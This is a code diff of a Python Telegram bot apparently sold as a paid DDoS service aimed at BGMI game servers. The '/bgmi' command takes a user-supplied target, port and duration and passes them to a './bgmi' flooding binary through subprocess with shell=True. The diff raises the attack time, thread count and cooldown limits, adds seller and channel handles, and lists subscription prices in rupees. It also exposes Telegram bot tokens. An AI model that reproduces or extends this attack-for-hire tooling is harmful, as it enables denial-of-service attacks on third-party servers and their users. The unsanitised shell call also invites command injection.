@@ -7,10 +7,10 @@ import datetime
 import os
 
 # insert your Telegram bot token here
-bot = telebot.TeleBot('6973915156:AAEvqBt2LAWBmNsCYyuoVzoAYMoXOmF39zA')
+bot = telebot.TeleBot('7388713021:AAHwZSDJl91hO85Q5iZ6hvXijQQ2QYOiq5U')
 
 # Admin user IDs
-admin_id = ["5034980235"]
+admin_id = ["5747402681"]
 
 # File to store allowed user IDs
 USER_FILE = "users.txt"
@@ -213,7 +213,7 @@ def start_attack_reply(message, target, port, time):
 # Dictionary to store the last time each user ran the /bgmi command
 bgmi_cooldown = {}
 
-COOLDOWN_TIME =0
+COOLDOWN_TIME =10
 
 # Handler for /bgmi command
 @bot.message_handler(commands=['bgmi'])
@@ -223,8 +223,8 @@ def handle_bgmi(message):
         # Check if the user is in admin_id (admins have no cooldown)
         if user_id not in admin_id:
             # Check if the user has run the command before and is still within the cooldown period
-            if user_id in bgmi_cooldown and (datetime.datetime.now() - bgmi_cooldown[user_id]).seconds < 300:
-                response = "You Are On Cooldown ❌. Please Wait 5min Before Running The /bgmi Command Again."
+            if user_id in bgmi_cooldown and (datetime.datetime.now() - bgmi_cooldown[user_id]).seconds < 10:
+                response = "You Are On Cooldown ❌. Please Wait 10 seconds Before Running The /bgmi Command Again."
                 bot.reply_to(message, response)
                 return
             # Update the last time the user ran the command
@@ -235,15 +235,15 @@ def handle_bgmi(message):
             target = command[1]
             port = int(command[2])  # Convert time to integer
             time = int(command[3])  # Convert port to integer
-            if time > 181:
-                response = "Error: Time interval must be less than 80."
+            if time > 231:
+                response = "Error: Time interval must be less than 230."
             else:
                 record_command_logs(user_id, '/bgmi', target, port, time)
                 log_command(user_id, target, port, time)
                 start_attack_reply(message, target, port, time)  # Call start_attack_reply function
-                full_command = f"./bgmi {target} {port} {time} 200"
+                full_command = f"./bgmi {target} {port} {time} 350"
                 subprocess.run(full_command, shell=True)
-                response = f"BGMI Attack Finished. Target: {target} Port: {port} Port: {time}"
+                response = f"BGMI Attack Finished. Target: {target} Port: {port} Time: {time}"
         else:
             response = "✅ Usage :- /bgmi <target> <port> <time>"  # Updated command syntax
     else:
@@ -285,7 +285,9 @@ def show_help(message):
 🤖 To See Admin Commands:
 💥 /admincmd : Shows All Admin Commands.
 
-
+Buy From :- @FENIXsSLAYER
+Official Channel :- @SUDO_APT_UPDATE
+'''
     for handler in bot.message_handlers:
         if hasattr(handler, 'commands'):
             if message.text.startswith('/help'):
@@ -301,7 +303,7 @@ def welcome_start(message):
     user_name = message.from_user.first_name
     response = f'''👋🏻Welcome to Your Home, {user_name}! Feel Free to Explore.
 🤖Try To Run This Command : /help 
-Welcome To The World's Best Ddos Bot⚡'''
+✅Join :- @SUDO_APT_UPDATE'''
     bot.reply_to(message, response)
 
 @bot.message_handler(commands=['rules'])
@@ -320,14 +322,14 @@ def welcome_plan(message):
     response = f'''{user_name}, Brother Only 1 Plan Is Powerfull Then Any Other Ddos !!:
 
 Vip 🌟 :
--> Attack Time : 200 (S)
-> After Attack Limit : 2 Min
--> Concurrents Attack : 300
+-> Attack Time : 230 (S)
+> After Attack Limit : 10 seconds
+-> Concurrents Attack : 3
 
 Pr-ice List💸 :
-Day-->150 Rs
-Week-->900 Rs
-Month-->1600 Rs
+Day-->120 Rs
+Week-->400 Rs
+Month-->1100 Rs
 '''
     bot.reply_to(message, response)
 
